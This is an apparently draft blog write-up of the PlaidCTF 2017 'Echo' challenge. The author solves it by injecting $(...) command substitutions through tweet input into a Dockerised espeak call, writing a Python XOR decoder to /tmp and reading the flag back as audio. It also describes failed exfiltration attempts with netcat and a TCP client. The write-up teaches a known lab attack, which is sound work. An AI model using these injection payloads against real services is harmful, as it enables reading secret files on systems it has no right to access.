---
title: "Echo"
date: 2017-04-24
draft: true
tags: [ctf,plaid,2017,docker,web,xor,command substitution]
---

Challenge:  If you hear enough, you may hear the whispers of a key...   
If you see [app.py][github-echo-app.py] well enough, you will notice the UI sucks...

No hints.

---

PPP (plaid parliament of pwning) puts on one of the best online Jeopardy CTFs. I wish I had more time that weekend (runs for 48hrs only) and a full team, either way I decided to give it a go.

Disclaimer, was not solved within the allotted time.

Alright, we have a flask app and the UI sucks. You enter some text:
<img src="/img/tweetInput.png" alt="" style="width: 500px;"/>

and it spits back an audio file of the inputted text:
<img src="/img/tweetAudio.png" alt=""/>

Taking a closer look at [app.py][github-echo-app.py] we see a few interesting things:

1. a <img src="/svg/docker-icon.svg" alt="" style="height: 36px;"/> container spawns and processes input tweets (140 chars max/tweet)

2. the flag is "encrypted" with a bitwise XOR
```python
for x in flag:
          c = 0
          towrite = ''
          for i in range(65000 - 1):
              k = random.randint(0,127)
              c = c ^ k
              towrite += chr(k)

          f.write(towrite + chr(c ^ ord(x)))
```

    + To decrypt each flag char you need the last `c` and `c` starts life at 0.
    + Each `k` is written to file **(this is important!)**

3. three items are mounted from host to the container: `-v {path}:/share`

    | host | container |
    | --- | --- |
    | host_path/input| /share/input |
    | host_path/out/ | /share/out/ |
    | host_path/flag | /share/flag |

4. the docker container was readily available on [dockerhub][dockerhub], with the interesting bit being [run.py][github-echo-run.py]. This converts each tweet TTS (text-to-speech) and stores the corresponding .wav files at /share/out/

    ```bash
    docker pull lumjjb/echo_container
    docker run -it lumjjb/echo_container /bin/bash
    cat run.py
    ```

    + Examining [run.py][github-echo-run.py] a bit closer we have [command substitution][commandsub] available via `l`. Awesome!

      `call(["sh","-c", "espeak " + " -w " + OUTPUT_PATH + str(i) + ".wav \"" + l + "\""])`

So let's start asking the container questions. My preference is `$(...)` instead of backticks ([Why is $(...) preferred over `` (backticks)?][backticks])

tweet_1: $(wc -c /share/flag)  = `2470000 flag`

Cool, the flag file is 2,470,000 bytes. We know a single flag char consumes 65,000 bytes (64,999 k values + 'encrypted' x). __So the flag length is 38__.

Here is where I got stuck. I was so focused on getting /share/flag _out_ of the container I overlooked a very important part of the challenge, there was no need to get the flag out. All the processing could be done on the container.

`/share/flag` has all values of k, which enables solving for c before the last XOR.

Here is code that would 'decrypt' the flag:

```python
with open ("/share/flag", "rb") as f:
    x=65000
    while True:
        b = f.read(x)
        if not b:
            break
        c=0
        for i in range(x-1):
            c = c ^ ord(b[i])
        print c ^ ord(b[x-1])
```

Each tweet is 140 characters max. Maybe there is a perl one liner? Most likely, but instead I  wrote some &#x1f40d; code into /tmp and ran it.

tweet_1
```bash
$(echo "with open (\"/share/flag\", \"rb\") as f:\n\tx=65000\n\twhile True:\n\t\tb = f.read(x)\n\t\tif not b:\n\t\t\tbreak" > /tmp/s.py)
```

tweet_2
```bash
$(echo "\t\tc=0\n\t\tfor i in range(x-1):\n\t\t\tc = c ^ ord(b[i])\n\t\tprint c ^ ord(b[x-1])" >> /tmp/s.py)
```

__tweet_3__
```bash
$(python /tmp/s.py)
```

audio from tweet_3 (3.wav) gave us the ASCII int

```python
>>> flag = [80, 67, 84, 70, 123, 76, 49, 53, 115, 116, 51, 110, 95, 84, 48, 95, 95, 114, 101, 101, 101, 95, 114, 101, 101, 101, 101, 101, 101, 95, 114, 101, 101, 101, 95, 108, 97, 125]
>>> "".join(chr(x) for x in flag)
```
**PCTF{L15st3n_T0__reee_reeeeee_reee_la}**

## PPP well done!

---

#### Failed attempts

1. Tried getting the last 3 k values and x for each flag char and brute forcing all the possible combinations. This was not fruitful and didn't seem like the right approach. Cannot solve without having all the k values.

2. tweet_1: `blank` , tweet_2: `cat /share/flag >> /share/out/1.wav` and then download 1.wav but this failed because ffmpeg could not recognize the file format and no .wav was generated in the first place.

3. I tried to get /share/flag off the container.  
 + `apt-get install` rsync, netcat, etc, etc. But none of those worked.  

4. I tried to setup a python TCP client and send the /share/flag back to a listening port but that did not work. Wait a second, `--network=none`, which means that container is lacking a network interface.

<iframe src="https://giphy.com/embed/1PIGU0cftC2pG" width="240" height="198" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/picard-1PIGU0cftC2pG"></a></p>

[github-echo-app.py]: https://gist.github.com/mfridman/28c68388e5b2b3ad2bfe7c2bb1cfc40d
[github-echo-run.py]: https://gist.github.com/mfridman/6fd4fa93f68ee61a5c52e1fe7893b6bb
[dockerhub]: https://hub.docker.com/r/lumjjb/echo_container/
[backticks]: http://mywiki.wooledge.org/BashFAQ/082
[commandsub]: http://tldp.org/LDP/abs/html/commandsub.html
